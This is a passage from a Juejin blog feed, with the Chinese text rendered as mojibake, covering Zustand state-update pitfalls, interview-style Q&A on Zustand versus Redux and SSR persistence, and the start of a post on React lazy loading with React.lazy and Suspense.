å‡è®¾ä½ åœ¨ <code>onClick</code> é‡Œè¿ç»­è°ƒç”¨ <code>increment()</code> ä¸‰æ¬¡ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// é”™è¯¯é¢„æœŸ</span>
onClick={() =&gt; {
  <span class="hljs-built_in">increment</span>(); <span class="hljs-comment">// å‡è®¾ count ä» 0 å˜ 1</span>
  <span class="hljs-built_in">increment</span>(); <span class="hljs-comment">// æœŸæœ›åŸºäº 1 å˜ 2</span>
  <span class="hljs-built_in">increment</span>(); <span class="hljs-comment">// æœŸæœ›åŸºäº 2 å˜ 3</span>
}}
</code></pre>
<p><strong>å®é™…ç»“æœ</strong>ï¼šå¯èƒ½åªåŠ äº† 1ã€‚</p>
<ul>
<li><strong>åŸå› </strong>ï¼š<code>set</code> æ˜¯å¼‚æ­¥çš„ã€‚ä¸Šé¢çš„ä»£ç åœ¨ä¸€æ¬¡äº‹ä»¶å¾ªç¯ä¸­è¿ç»­è§¦å‘äº†ä¸‰æ¬¡ <code>set</code>ï¼Œå®ƒä»¬å¯èƒ½éƒ½åŸºäºæœ€åˆçš„ <code>state</code>ï¼ˆ0ï¼‰è¿›è¡Œè®¡ç®—ã€‚</li>
<li><strong>è§£å†³</strong>ï¼šå¦‚æœå¿…é¡»è¿ç»­ä¿®æ”¹ï¼Œåº”è¯¥åœ¨ä¸€æ¬¡ <code>set</code> é‡Œå®Œæˆï¼š</li>
</ul>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">set</span>((state) =&gt; ({ count: state.count + <span class="hljs-number">3</span> }))
</code></pre>
<h4 data-id="heading-14">3.3 è¡¨å•ä¸çŠ¶æ€çš„åŒå‘ç»‘å®š</h4>
<p>è™½ç„¶ä½ çš„ä»£ç ä¸­æ²¡æœ‰å¤æ‚çš„è¡¨å•ï¼Œä½†åœ¨ Todo åº”ç”¨ä¸­ï¼Œé€šå¸¸ä¼šæœ‰ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä¼ªä»£ç </span>
&lt;<span class="hljs-selector-tag">input</span> 
  value={newTitle} 
  onChange={(e) =&gt; <span class="hljs-built_in">setNewTitle</span>(e.target.value)} 
/&gt;
&lt;<span class="hljs-selector-tag">button</span> onClick={() =&gt; <span class="hljs-built_in">addTodo</span>(newTitle)}&gt;Add&lt;/<span class="hljs-selector-tag">button</span>&gt;
</code></pre>
<p>è¿™é‡Œ <code>newTitle</code> æ˜¯ç»„ä»¶çš„æœ¬åœ°çŠ¶æ€ï¼ˆ<code>useState</code>ï¼‰ï¼Œè€Œ <code>todos</code> æ˜¯å…¨å±€çŠ¶æ€ã€‚<strong>åŒºåˆ†â€œæœ¬åœ° UI çŠ¶æ€â€å’Œâ€œå…¨å±€ä¸šåŠ¡çŠ¶æ€â€æ˜¯æ¶æ„è®¾è®¡çš„å…³é”®ã€‚</strong></p>
<h4 data-id="heading-15">â“ ç­”ç–‘è§£æƒ‘ç¯èŠ‚ 3</h4>
<p><strong>Q: ä¸ºä»€ä¹ˆåœ¨ç»„ä»¶é‡Œä¸éœ€è¦ <code>useEffect</code> æ¥ç›‘å¬ Store çš„å˜åŒ–ï¼Ÿ</strong><br/>
A: å› ä¸º Zustand çš„ Store Hookï¼ˆå¦‚ <code>useCountStore</code>ï¼‰å†…éƒ¨å·²ç»å¸®ä½ åšäº†è¿™ä»¶äº‹ã€‚<br/>
å½“ä½ è°ƒç”¨ <code>useCountStore()</code> æ—¶ï¼Œå®ƒä¸ä»…è¿”å›å½“å‰å€¼ï¼Œè¿˜æ³¨å†Œäº†ä¸€ä¸ªç›‘å¬å™¨ã€‚ä¸€æ—¦ Store æ›´æ–°ï¼Œå®ƒä¼šå¼ºåˆ¶ç»„ä»¶é‡æ–°æ‰§è¡Œ <code>render</code>ã€‚ä½ åªéœ€è¦åƒä½¿ç”¨æ™®é€šå˜é‡ä¸€æ ·ä½¿ç”¨å®ƒå³å¯ã€‚</p>
<p><strong>Q: å¦‚æœæˆ‘æƒ³åœ¨ç”¨æˆ·ç™»å½•æˆåŠŸåè·³è½¬é¡µé¢ï¼Œè¯¥åœ¨å“ªå†™ä»£ç ï¼Ÿ</strong><br/>
A: ä¸è¦åœ¨ Store é‡Œå†™è·³è½¬é€»è¾‘ï¼ˆå¦‚ <code>window.location.href</code>ï¼‰ï¼Œè¿™ä¼šè®© Store ä¾èµ–æµè§ˆå™¨ APIï¼Œå˜å¾—éš¾ä»¥æµ‹è¯•ã€‚<br/>
<strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ol>
<li>
<p>Store åªè´Ÿè´£æŠŠ <code>isLoggin</code> æ”¹ä¸º <code>true</code>ã€‚</p>
</li>
<li>
<p>åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ <code>useEffect</code> ç›‘å¬ <code>isLoggin</code>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">useEffect</span>(() =&gt; {
  if (isLoggin) <span class="hljs-built_in">navigate</span>('/home'); <span class="hljs-comment">// å‡è®¾ç”¨äº† react-router</span>
}, <span class="hljs-selector-attr">[isLoggin]</span>);
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-16">ç¬¬å››æ¨¡å—ï¼šç‰›åˆ€å°è¯•</h3>
<h4 data-id="heading-17">ğŸ’¼ 1ï¼šZustand ä¸ Redux çš„æœ¬è´¨åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿä»€ä¹ˆæ—¶å€™è¯¥ç”¨ Zustandï¼Ÿ</h4>
<p><strong>å‚è€ƒå›ç­”æ€è·¯ï¼š</strong></p>
<ul>
<li><strong>èŒƒå¼å·®å¼‚</strong>ï¼šRedux å¼ºè°ƒâ€œçº¯å‡½æ•°â€ã€â€œActionâ€ã€â€œReducerâ€å’Œâ€œå•ä¸€çŠ¶æ€æ ‘â€ï¼Œæ ·æ¿ä»£ç å¤šï¼Œé€‚åˆè¶…å¤§å‹å¤æ‚é¡¹ç›®ï¼ˆå¦‚éœ€è¦æ—¶é—´æ—…è¡Œè°ƒè¯•ï¼‰ã€‚Zustand å¼ºè°ƒâ€œHooks é£æ ¼â€å’Œâ€œä¸­é—´ä»¶â€ï¼Œå‡ ä¹æ²¡æœ‰æ ·æ¿ä»£ç ï¼Œæ›´ç¬¦åˆç°ä»£ React å¼€å‘è€…çš„ç›´è§‰ã€‚</li>
<li><strong>æ€§èƒ½æœºåˆ¶</strong>ï¼šRedux é»˜è®¤ä½¿ç”¨ <code>connect</code> æˆ– <code>useSelector</code> éœ€è¦æ‰‹åŠ¨ä¼˜åŒ–ï¼ˆ<code>shallowEqual</code>ï¼‰ã€‚Zustand å¤©ç„¶åŸºäºé€‰æ‹©å™¨ï¼ˆSelectorï¼‰ï¼Œåªæœ‰è®¢é˜…çš„å­—æ®µå˜åŒ–æ‰ä¼šé‡æ¸²æŸ“ï¼Œæ€§èƒ½å¼€ç®±å³ç”¨ã€‚</li>
<li><strong>ç»“è®º</strong>ï¼šé™¤éé¡¹ç›®æœ‰æå¼ºçš„è°ƒè¯•å›æº¯éœ€æ±‚æˆ–å›¢é˜Ÿè§„èŒƒå¼ºåˆ¶ä½¿ç”¨ Reduxï¼Œå¦åˆ™å¯¹äºä¸­å°å‹é¡¹ç›®ï¼ŒZustand æ˜¯æ›´é«˜æ•ˆã€æ›´ç®€æ´çš„é€‰æ‹©ã€‚</li>
</ul>
<h4 data-id="heading-18">ğŸ’¼ 2ï¼šåœ¨ä½ çš„ä»£ç ä¸­ï¼Œ<code>user: { ...user, id: 1 }</code> è¿™ä¸€è¡Œä¸ºä»€ä¹ˆè¦ç”¨æ‰©å±•è¿ç®—ç¬¦ï¼Ÿç›´æ¥ä¼  <code>user</code> ä¸è¡Œå—ï¼Ÿ</h4>
<p><strong>å‚è€ƒå›ç­”æ€è·¯ï¼š</strong><br/>
è¿™è€ƒå¯Ÿçš„æ˜¯<strong>ä¸å¯å˜æ€§ï¼ˆImmutabilityï¼‰<strong>å’Œ</strong>ç±»å‹å®‰å…¨</strong>ã€‚</p>
<ol>
<li><strong>ç±»å‹è¡¥å……</strong>ï¼šä¼ å…¥çš„ <code>user</code> å‚æ•°å¯èƒ½åªåŒ…å« <code>username</code> å’Œ <code>password</code>ï¼ˆæ¥è‡ªè¡¨å•ï¼‰ï¼Œä½† Store å®šä¹‰çš„ <code>User</code> æ¥å£è¦æ±‚å¿…é¡»æœ‰ <code>id</code>ã€‚æ‰©å±•è¿ç®—ç¬¦å…è®¸æˆ‘ä»¬åœ¨ä¿ç•™åŸæœ‰æ•°æ®çš„åŒæ—¶ï¼Œæ³¨å…¥ç¼ºå¤±çš„ <code>id</code>ã€‚</li>
<li><strong>å¼•ç”¨éš”ç¦»</strong>ï¼šç›´æ¥ä½¿ç”¨ä¼ å…¥çš„ <code>user</code> å¯¹è±¡å¯èƒ½ä¼šå¯¼è‡´å¼•ç”¨æ±¡æŸ“ã€‚ä½¿ç”¨ <code>{...user}</code> åˆ›å»ºäº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œä¿è¯äº† Store å†…éƒ¨çŠ¶æ€çš„çº¯å‡€ï¼Œé¿å…å¤–éƒ¨å¯¹è±¡åç»­ä¿®æ”¹å½±å“åˆ° Storeã€‚</li>
</ol>
<h4 data-id="heading-19">ğŸ’¼  3ï¼šå¦‚æœæˆ‘ä»¬çš„åº”ç”¨éœ€è¦åšæœåŠ¡ç«¯æ¸²æŸ“ï¼ˆSSRï¼‰ï¼Œä½ å†™çš„ <code>persist</code> ä»£ç ä¼šæœ‰é—®é¢˜å—ï¼Ÿå¦‚ä½•è§£å†³ï¼Ÿ</h4>
<p><strong>å‚è€ƒå›ç­”æ€è·¯ï¼š</strong><br/>
<strong>ä¼šæœ‰é—®é¢˜ã€‚</strong></p>
<ul>
<li>
<p><strong>åŸå› </strong>ï¼š<code>persist</code> é»˜è®¤ä½¿ç”¨æµè§ˆå™¨çš„ <code>localStorage</code>ã€‚åœ¨æœåŠ¡ç«¯ï¼ˆNode.jsï¼‰ç¯å¢ƒä¸­ï¼Œæ²¡æœ‰ <code>window</code> å¯¹è±¡ï¼Œä¹Ÿæ²¡æœ‰ <code>localStorage</code>ã€‚å¦‚æœåœ¨ SSR é¦–å±æ¸²æŸ“æ—¶ç›´æ¥æ‰§è¡Œè¿™æ®µä»£ç ï¼ŒæœåŠ¡ç«¯ä¼šæŠ¥é”™ <code>ReferenceError: window is not defined</code>ã€‚</p>
</li>
<li>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li>
<p><strong>åŠ¨æ€å¯¼å…¥</strong>ï¼šåœ¨ SSR ç¯å¢ƒä¸‹ï¼Œå»¶è¿ŸåŠ è½½åŒ…å« <code>persist</code> çš„ Storeï¼Œæˆ–è€…åœ¨ Store åˆå§‹åŒ–æ—¶æ£€æµ‹ç¯å¢ƒã€‚</p>
</li>
<li>
<p><strong>è‡ªå®šä¹‰ Storage</strong>ï¼šç»™ <code>persist</code> ä¼ å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„ <code>storage</code> é…ç½®ã€‚åœ¨æœåŠ¡ç«¯ä½¿ç”¨å†…å­˜å­˜å‚¨æˆ– cookieï¼Œåœ¨å®¢æˆ·ç«¯ä½¿ç”¨ localStorageã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> customStorage = {
  <span class="hljs-attr">getItem</span>: <span class="hljs-function">(<span class="hljs-params">name</span>) =&gt;</span> {
    <span class="hljs-comment">// æœåŠ¡ç«¯é€»è¾‘ï¼šä» cookie è¯»å–</span>
    <span class="hljs-comment">// å®¢æˆ·ç«¯é€»è¾‘ï¼šä» localStorage è¯»å–</span>
  },
  <span class="hljs-attr">setItem</span>: <span class="hljs-function">(<span class="hljs-params">name, value</span>) =&gt;</span> {
    <span class="hljs-comment">// å®¢æˆ·ç«¯å†™å…¥ localStorage</span>
  }
}
</code></pre>
</li>
</ol>
</li>
</ul>
<hr/>
<h4 data-id="heading-20">ğŸŒŸ ç»“è¯­</h4>
<p>ç¼–ç¨‹ä¸ä»…ä»…æ˜¯å†™ä»£ç ï¼Œæ›´æ˜¯<strong>é€»è¾‘çš„æ„å»ºä¸é”™è¯¯çš„è§„é¿</strong>ã€‚</p>
<p>é€šè¿‡è¿™ç¯‡åšå®¢ï¼Œæˆ‘å¸Œæœ›ä½ ä¸ä»…å­¦ä¼šäº†å¦‚ä½•ä½¿ç”¨ Zustand å’Œ TypeScriptï¼Œæ›´é‡è¦çš„æ˜¯ç†è§£äº† <strong>â€œçŠ¶æ€æ˜¯å”¯ä¸€çš„çœŸç›¸æºï¼ˆSource of Truthï¼‰â€</strong> è¿™ä¸€ç†å¿µã€‚</p>
<p>è®°ä½ï¼š<strong>ä¼˜ç§€çš„ä»£ç ä¸æ˜¯å†™å‡ºæ¥çš„ï¼Œæ˜¯é‡æ„å‡ºæ¥çš„ã€‚</strong> æ¯ä¸€æ¬¡å¯¹â€œæ˜“é”™ç‚¹â€çš„è§„é¿ï¼Œéƒ½æ˜¯ä½ ç¼–ç¨‹å†…åŠŸçš„ä¸€æ¬¡æå‡ã€‚</p>
<p>ç¥ä½ åœ¨å‰ç«¯å¼€å‘çš„é“è·¯ä¸Šï¼Œä»£ç æ—  Bugï¼Œäººç”Ÿæ— å‘ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†è®©ç”¨æˆ·ç­‰å“­ï¼React æ‡’åŠ è½½ï¼šè®©ç»„ä»¶ â€œèººå¹³â€ åˆ°è¦ç”¨æ—¶å†å¹²æ´»]]></title>    <link>https://juejin.cn/post/7600955777315979302</link>    <guid>https://juejin.cn/post/7600955777315979302</guid>    <pubDate>2026-01-30T13:13:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315979302" data-draft-id="7600299283485114418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†è®©ç”¨æˆ·ç­‰å“­ï¼React æ‡’åŠ è½½ï¼šè®©ç»„ä»¶ â€œèººå¹³â€ åˆ°è¦ç”¨æ—¶å†å¹²æ´»"/> <meta itemprop="keywords" content="React.js,å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-30T13:13:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£æ­¢ä½•å®‰å•Š"/> <meta itemprop="url" content="https://juejin.cn/user/2517239724512420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†è®©ç”¨æˆ·ç­‰å“­ï¼React æ‡’åŠ è½½ï¼šè®©ç»„ä»¶ â€œèººå¹³â€ åˆ°è¦ç”¨æ—¶å†å¹²æ´»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2517239724512420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£æ­¢ä½•å®‰å•Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:13:55.000Z" title="Fri Jan 30 2026 13:13:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¹‹å‰å’±ä»¬èŠäº†<strong>æ™®é€šç½‘é¡µçš„å›¾ç‰‡æ‡’åŠ è½½</strong> â€”â€” è®©å›¾ç‰‡ <strong>â€œè—â€ åœ¨å±å¹•å¤–æ‘¸é±¼</strong>ï¼Œæ»šåˆ°çœ¼å‰å†å¼€å·¥ã€‚é‚£ <code>React</code> é¡¹ç›®é‡Œçš„ç»„ä»¶å’Œå›¾ç‰‡å‘¢ï¼Ÿæ€»ä¸èƒ½ä¸€æ‰“å¼€é¡µé¢å°±æŠŠæ‰€æœ‰ç»„ä»¶çš„ä»£ç éƒ½æ‹½è¿‡æ¥å§ï¼Ÿ</p>
<p><strong>æƒ³è±¡ä¸‹</strong>ï¼šä½ æ‰“å¼€<strong>è´­ç‰©App</strong>é¡µé¢ï¼Œé¦–é¡µå°±åŠ è½½äº† <strong>â€œè®¢å•é¡µâ€â€œä¸ªäººä¸­å¿ƒâ€</strong> çš„ä»£ç ï¼Œç»“æœç”¨æˆ·æ ¹æœ¬æ²¡ç‚¹è¿›å» â€”â€” è¿™ä¸æ˜¯çº¯çº¯çš„æµªè´¹æµé‡å’Œæ€§èƒ½å—ï¼Ÿ<code>React çš„æ‡’åŠ è½½</code>ï¼Œå°±æ˜¯ç»™ç»„ä»¶å’Œå›¾ç‰‡å‘ <code>â€œæ‘¸é±¼è®¸å¯è¯â€</code>ï¼š<strong>æ²¡å‡ºç°åœ¨è§†é‡é‡Œï¼Œå°±åˆ«åŠ è½½ï¼Œèººå¹³åˆ°è¦ç”¨æ—¶å†å¹²æ´»</strong>ã€‚</p>
<p>å¦‚æœä¸äº†è§£<strong>æ‡’åŠ è½½</strong>çš„ï¼Œæˆ‘çš„ä¸Šç¯‡æ–‡ç« åœ¨è¿™ï¼š</p>
<blockquote>
<p><a href="https://juejin.cn/post/7600224355294576667" target="_blank" title="https://juejin.cn/post/7600224355294576667">æ•‘å‘½ï¼æˆ‘é‚£åŠ è½½æ…¢åˆ°ç¦»è°±çš„å›¾ç‰‡ï¼Œç»ˆäºè¢«æ‡’åŠ è½½ â€œæ•‘æ´»â€ äº†</a></p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€React é‡Œçš„ â€œç»„ä»¶æ‡’åŠ è½½â€ï¼š<code>React.lazy</code> + åŠ¨æ€å¯¼å…¥</h3>
<p>æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ª<code>Demoç»„ä»¶</code>ï¼Œå¹¶çœ‹è¿™è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// åˆ«ç›´æ¥import Demoï¼Œæ”¹æˆåŠ¨æ€å¯¼å…¥ </span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Demo</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./Demo'</span>));
</code></pre>
<p><strong>è¿™è¡Œä»£ç çš„é­”åŠ›åœ¨äºï¼š</strong></p>
<ul>
<li>åŸæœ¬<code>import Demo from './Demo'</code>ä¼šåœ¨é¡µé¢åˆå§‹åŒ–æ—¶å°±<strong>åŠ è½½ Demo ç»„ä»¶çš„ä»£ç </strong>ï¼›</li>
<li>ç”¨<code>React.lazy</code>+<code>import()</code>åŒ…è£¹åï¼ŒDemo çš„ä»£ç ä¼šè¢«<strong>å•ç‹¬æ‰“åŒ…æˆä¸€ä¸ªå°æ–‡ä»¶</strong>ï¼Œåªæœ‰<code>å½“ Demo ç»„ä»¶è¦è¢«æ¸²æŸ“</code>ï¼ˆæ¯”å¦‚æ»šåˆ°å¯è§†åŒºåŸŸï¼‰æ—¶ï¼Œè¿™ä¸ªå°æ–‡ä»¶æ‰ä¼šè¢«ä¸‹è½½ã€åŠ è½½ã€‚</li>
</ul>
<p><strong>æ­é…<code>Suspense</code>ï¼ˆä¸ç„¶ç»„ä»¶åŠ è½½æ—¶ä¼š â€œå´©â€ï¼‰</strong></p>
<p>ä¸è¿‡å…‰ç”¨<code>lazy</code>è¿˜ä¸å¤Ÿ â€”â€” ç»„ä»¶åŠ è½½éœ€è¦æ—¶é—´ï¼ŒåŠ è½½è¿‡ç¨‹ä¸­é¡µé¢ä¼šæŠ¥é”™ã€‚å¾—ç”¨<code>Suspense</code>å½“ â€œå ä½ç¬¦â€ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">import</span> { lazy, <span class="hljs-title class_">Suspense</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Demo</span> = <span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./Demo'</span>));

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {/* ä¸€å †å†…å®¹... */}
            <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">div</span>&gt;</span>ç»„ä»¶åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>}&gt;
                <span class="hljs-tag">&lt;<span class="hljs-name">Demo</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p><code>fallback</code>é‡Œå†™çš„å°±æ˜¯ç»„ä»¶åŠ è½½æ—¶çš„ <strong>â€œLoading å ä½â€</strong>ï¼Œæ¯”å¦‚è½¬åœˆåœˆã€æç¤ºæ–‡å­—ï¼Œç”¨æˆ·ä½“éªŒä¼šæ›´å‹å¥½ã€‚</p>
<h3 data-id="heading-2">äºŒã€React é‡Œçš„ â€œå›¾ç‰‡ / å†…å®¹æ‡’åŠ è½½â€ï¼š<code>react-lazyload</code> æˆ– è‡ªå®šä¹‰ç»„ä»¶</h3>
